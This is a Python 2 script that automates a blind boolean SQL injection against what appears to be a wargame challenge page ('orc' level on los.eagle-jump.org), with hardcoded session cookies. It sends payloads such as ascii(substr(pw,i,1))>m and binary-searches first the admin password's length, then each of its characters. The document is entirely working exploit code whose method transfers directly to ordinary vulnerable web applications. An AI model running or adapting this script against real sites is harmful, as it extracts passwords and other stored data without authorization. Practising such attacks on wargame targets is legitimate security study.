import urllib
import urllib2
def getlength():
    url = 'http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw='
    s=0
    t=30
    while (s<t):
        if (t-s==1):
            if doinject('\'||ascii(id)=97%26%26length(pw)='+str(t)+'%23'):
                m=t
                break
            else:
                m=s
                break
        m=(s+t)/2
        if doinject('\'||ascii(id)=97%26%26length(pw)>'+str(m)+'%23'):
            s=m+1
        else:
            t=m
    print '[*]length is %s' % m
    return m
def doinject(payload):
    url = 'http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw='
    #print payload
    url=url+payload
    #print url
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
    info = { 'User-Agent' : user_agent,
                'cookie':'__cfduid=dad2e2829958f82d5741ad845023671931508994468; PHPSESSID=4jr3sjglvj111r061sif5d2m51'
              }
    req = urllib2.Request(str(url),headers=info)
    response = urllib2.urlopen(req)
    the_page = response.read()
    #print the_page
    if (the_page.find("Hello admin")>1):
        return True
    else:
        return False
    
if __name__=='__main__':
		a=getlength()+1
		res = ""
		for i in range(1,a):
			s=0
			t=127
			while (s<t):
				if (t-s==1):
					if doinject('\'||ascii(id)=97%26%26ascii(substr(pw,'+str(i)+',1))='+str(t)+'%23'):#important 
						m=t
						break
					else:
						m=s
						break
				m=(s+t)/2
				if doinject('\'||ascii(id)=97%26%26ascii(substr(pw,'+str(i)+',1))>'+str(m)+'%23'):
					s=m+1
				else:
					t=m
			res = res+chr(m)
			print '[*]%s'% res
		print '[*] ok ! get it!'